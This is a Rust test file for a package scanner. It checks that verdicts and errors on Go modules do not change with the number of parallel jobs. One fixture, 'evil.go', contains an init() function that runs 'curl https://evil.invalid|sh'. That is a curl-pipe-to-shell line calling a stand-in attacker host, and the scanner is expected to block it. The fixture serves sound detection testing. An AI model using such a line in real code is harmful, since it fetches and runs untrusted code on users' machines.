use argus_core::{Decision, ExecutionContext, ScanConcurrency, ScanReport};
use argus_go::dirhash::compute_h1;
use argus_go::{fetch_and_scan_go_with_rules_and_context, GoFetchOptions, GoModuleRef};
use argus_rules::RuleSession;
use argus_test_support::MockTransport;
use std::io::Write;

const REGISTRY: &str = "https://mock.proxy";
const MODULE: &str = "example.com/jobsparity";
const VERSION: &str = "v1.0.0";

fn make_go_jobs_module_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut bytes = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut bytes));
        let options: zip::write::FileOptions<()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (path, body) in files {
            writer
                .start_file(format!("{MODULE}@{VERSION}/{path}"), options)
                .unwrap();
            writer.write_all(body).unwrap();
        }
        writer.finish().unwrap();
    }
    bytes
}

fn go_jobs_h1(files: &[(&str, &[u8])]) -> String {
    compute_h1(
        &files
            .iter()
            .map(|(path, body)| (format!("{MODULE}@{VERSION}/{path}"), body.to_vec()))
            .collect::<Vec<_>>(),
    )
}

fn go_jobs_execution(jobs: usize) -> ExecutionContext {
    ExecutionContext::new(ScanConcurrency::new(jobs).unwrap()).unwrap()
}

fn scan_go_jobs_fixture(
    files: &[(&str, &[u8])],
    rules: &RuleSession,
    jobs: usize,
) -> anyhow::Result<ScanReport> {
    let transport = MockTransport::new();
    transport.insert(
        &format!("{REGISTRY}/{MODULE}/@v/{VERSION}.zip"),
        make_go_jobs_module_zip(files),
    );
    transport.insert(
        &format!("{REGISTRY}/{MODULE}/@v/{VERSION}.ziphash"),
        go_jobs_h1(files).into_bytes(),
    );
    fetch_and_scan_go_with_rules_and_context(
        &GoModuleRef::parse(&format!("{MODULE}@{VERSION}")).unwrap(),
        &GoFetchOptions {
            registry: REGISTRY.to_string(),
            ..GoFetchOptions::default()
        },
        &transport,
        rules,
        &go_jobs_execution(jobs),
    )
}

fn assert_go_report_parity(scan_case: impl Fn(usize) -> anyhow::Result<ScanReport>) -> ScanReport {
    let baseline = scan_case(1).unwrap();
    let baseline_json = serde_json::to_vec(&baseline).unwrap();
    for jobs in [2, 8, 64] {
        assert_eq!(
            serde_json::to_vec(&scan_case(jobs).unwrap()).unwrap(),
            baseline_json,
            "report changed with jobs={jobs}"
        );
    }
    baseline
}

#[test]
fn go_builtin_reports_and_errors_are_jobs_invariant() {
    let go_mod = b"module example.com/jobsparity\n\ngo 1.21\n";
    let builtin = RuleSession::builtin().unwrap();
    let positive = assert_go_report_parity(|jobs| {
        scan_go_jobs_fixture(
            &[
                ("go.mod", go_mod),
                (
                    "evil.go",
                    br#"package jobsparity
import "os/exec"
func init() { exec.Command("sh", "-c", "curl https://evil.invalid|sh").Run() }
"#,
                ),
            ],
            &builtin,
            jobs,
        )
    });
    assert_eq!(positive.decision, Decision::Block);
    assert!(positive
        .findings
        .iter()
        .any(|finding| finding.rule_id == "go-init-exec"));

    let clean = assert_go_report_parity(|jobs| {
        scan_go_jobs_fixture(
            &[
                ("go.mod", go_mod),
                (
                    "lib.go",
                    b"package jobsparity\nfunc Add(a, b int) int { return a + b }\n",
                ),
            ],
            &builtin,
            jobs,
        )
    });
    assert_eq!(clean.decision, Decision::Allow);

    let rules_dir = tempfile::tempdir().unwrap();
    std::fs::write(
        rules_dir.path().join("error.yaml"),
        "schema_version: 1\nrules:\n  - { id: jobs-error, description: jobs error, \
         policy_class: blocking, default_severity: high, \
         help_uri: https://example.test/jobs-error, languages: [text], \
         matcher: { kind: literal, pattern: marker } }\n",
    )
    .unwrap();
    let error_rules = RuleSession::load(Some(rules_dir.path()), &[]).unwrap();
    let malformed = [
        ("go.mod", go_mod.as_slice()),
        ("a-invalid.txt", b"marker \xff".as_slice()),
        ("b-invalid.txt", b"marker \xfe".as_slice()),
    ];
    let error_for = |jobs| {
        format!(
            "{:#}",
            scan_go_jobs_fixture(&malformed, &error_rules, jobs).unwrap_err()
        )
    };
    let baseline_error = error_for(1);
    assert!(baseline_error.contains("a-invalid.txt"), "{baseline_error}");
    for jobs in [2, 8, 64] {
        assert_eq!(
            error_for(jobs),
            baseline_error,
            "error changed with jobs={jobs}"
        );
    }
}
